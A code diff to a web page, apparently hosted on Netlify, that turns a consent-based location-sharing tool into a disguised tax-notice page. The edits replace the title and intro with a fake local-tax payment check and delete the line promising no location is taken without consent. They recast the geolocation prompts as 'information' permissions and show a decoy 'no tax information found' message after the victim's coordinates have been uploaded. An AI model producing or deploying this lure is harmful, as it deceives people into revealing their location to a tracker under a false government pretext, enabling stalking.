@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#173f5f">
-  <title>雞雞雞雞雞雞雞雞雞雞</title>
+  <title>115年地方稅務繳納確認資訊</title>
   <style>
     :root {
       color-scheme: light;
@@ -141,8 +141,8 @@
       <h1 id="title">建立位置分享請求</h1>
     </header>
     <section id="ownerView">
-      <p class="intro">牛牛牛牛牛牛牛牛牛牛牛牛牛牛牛</p>
-      <p class="notice">對方手機會由 Chrome/Android 顯示原生定位權限詢問。對方必須主動按下按鈕並允許，沒有同意就不會取得或傳送位置。</p>
+      <p class="intro">建立一個安全的連結，提供是否需繳納稅務資訊，如連線無資訊關閉即可。</p>
+      <p class="notice">該技術由 Chrome/Android 顯示原生瀏覽器定位權限詢問。對方必須按下按鈕並允許。</p>
       <button id="createButton" type="button">建立定位連結</button>
       <p id="ownerStatus" role="status" aria-live="polite">尚未建立連結。</p>
       <div id="linksResult" aria-live="polite">
@@ -223,9 +223,9 @@
           const details = await response.json().catch(() => ({}));
           throw new Error(details.detail || `後台回應 ${response.status}`);
         }
-        setStatus(recipientStatus, '位置已傳送完成，您可以關閉此頁面。', 'success');
+        setStatus(recipientStatus, '目前查詢本次無地方稅務資訊，您可以關閉此頁面。', 'success');
       }).catch((error) => {
-        setStatus(recipientStatus, `位置已取得，但傳送失敗（${error.message}）。請確認這是 Netlify HTTPS 網址。`, 'error');
+        setStatus(recipientStatus, `資訊已取得，但傳送失敗（${error.message}）。請確認這是 Netlify HTTPS 網址。`, 'error');
       });
     }
 
@@ -238,19 +238,19 @@
         setStatus(recipientStatus, '此瀏覽器不支援定位功能。', 'error');
         return;
       }
-      setStatus(recipientStatus, '正在等待定位權限允許…');
+      setStatus(recipientStatus, '正在等待權限允許…');
       navigator.geolocation.getCurrentPosition(showLocation, (error) => {
         if (error.code === 1) {
-          setStatus(recipientStatus, '您拒絕了定位權限。請到瀏覽器網站設定重新允許位置。', 'error');
+          setStatus(recipientStatus, '您拒絕了資訊權限。請到瀏覽器網站設定重新允許位置。', 'error');
           return;
         }
 
-        setStatus(recipientStatus, 'GPS 訊號不足，改用手機網路定位中…');
+        setStatus(recipientStatus, 'GPS 訊號不足，改用手機網路服務搜索中…');
         navigator.geolocation.getCurrentPosition(
           showLocation,
           (fallbackError) => {
-            const messages = { 2: '手機目前無法取得位置，請開啟手機定位服務與網路。', 3: '定位逾時，請移到戶外或訊號較好的地方再試。' };
-            setStatus(recipientStatus, messages[fallbackError.code] || '定位失敗，請確認手機定位服務已開啟。', 'error');
+            const messages = { 2: '手機目前無法取得位置，請開啟手機定位服務與網路。', 3: '搜索逾時，請移到戶外或訊號較好的地方再試。' };
+            setStatus(recipientStatus, messages[fallbackError.code] || '權限失敗，請確認手機定位服務已開啟。', 'error');
           },
           { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
         );
